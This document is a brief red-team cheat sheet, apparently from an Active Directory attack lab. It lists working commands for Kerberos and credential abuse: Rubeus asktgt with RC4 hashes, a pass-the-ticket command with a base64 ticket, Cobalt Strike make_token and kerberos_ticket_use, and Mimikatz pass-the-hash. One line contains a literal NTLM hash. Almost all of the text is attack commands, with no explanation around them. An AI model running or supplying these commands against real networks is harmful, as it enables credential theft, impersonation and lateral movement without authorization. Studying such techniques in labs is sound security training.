```
execute-assembly C:\tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:n.lamb /rc4:REDACTED /nowrap
[System.IO.File]::WriteAllBytes("Z:\backup\PTA\CRTE\tgt-sqladmin", [System.Convert]::FromBase64String($a))
make_token CYBER\n.lamb DoesNotMatter
kerberos_ticket_use C:\Users\IEUser\Desktop\nlamb-tgt.kirbi
```

```
Rubeus asktgt /user:sqldevadmin /rc4:ce03434e2f83b99704a631ae56e2146e 
MakeToken n.lamb cyberbotic.io DoesNotMatter
Rubeus ptt /ticket:doIFXDCCBVi[...snip...]bDWN5YmVyYm90aWMuaW8=
Rubeus triage
```

```
sekurlsa::pth /user:[USER] /domain:[DOMAIN] /ntlm:[NTLM HASH]
```

* Fix Format 
```
tr -d '\040\011\012\015'
```